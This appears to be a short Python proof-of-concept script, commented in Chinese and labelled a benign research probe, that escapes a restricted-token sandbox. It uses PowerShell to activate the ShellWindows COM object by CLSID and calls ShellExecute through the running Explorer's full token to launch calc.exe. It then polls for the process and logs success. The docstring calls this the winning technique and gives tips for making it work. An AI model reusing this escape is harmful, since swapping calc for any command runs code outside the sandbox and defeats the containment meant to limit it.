#!/usr/bin/env python3
# -*- coding: utf-8 -*-
r"""[BENIGN RESEARCH PROBE] 经运行中 Explorer(完整令牌)委托拉起计算器 —— 制胜技术。

同样在沙箱 runner 下运行。要点：
1. ProgID 在受限令牌下解析为全零 CLSID，必须 [Type]::GetTypeFromCLSID 直连
2. UWP 激活经委托路径约需 7 秒，轮询判断至少等 15 秒（我们第一轮 6 秒轮询误判过失败）
"""
import datetime
import getpass
import os
import subprocess
import time

LOG = os.path.join(os.path.dirname(os.path.abspath(__file__)), "TRIGGER_LOG.txt")

PS = "$t=[Type]::GetTypeFromCLSID('9BA05972-F6A8-11CF-A442-00A0C90A8F39');" \
     "$sw=[Activator]::CreateInstance($t);" \
     "$sw.Item(0).Document.Application.ShellExecute('calc.exe','','','open',1)"


def log(tag, msg):
    with open(LOG, "a", encoding="utf-8") as f:
        f.write("[%s] %s user=%s %s\n" % (tag, datetime.datetime.now().isoformat(timespec="seconds"), getpass.getuser(), msg))


def calc_alive():
    r = subprocess.run(["tasklist", "/fi", "IMAGENAME eq CalculatorApp.exe"], capture_output=True)
    return b"CalculatorApp.exe" in r.stdout


def main():
    log("DELEGATION", "issuing")
    subprocess.run(["powershell", "-NoProfile", "-Command", PS], capture_output=True, timeout=60)
    for i in range(30):  # 15 秒轮询：UWP 委托激活需要 ~7 秒
        if calc_alive():
            log("DELEGATION", "CALC ALIVE after %ds" % (i // 2))
            print("计算器已拉起")
            return
        time.sleep(0.5)
    log("DELEGATION", "no calc after 15s")
    print("15 秒内未见计算器进程")


if __name__ == "__main__":
    main()
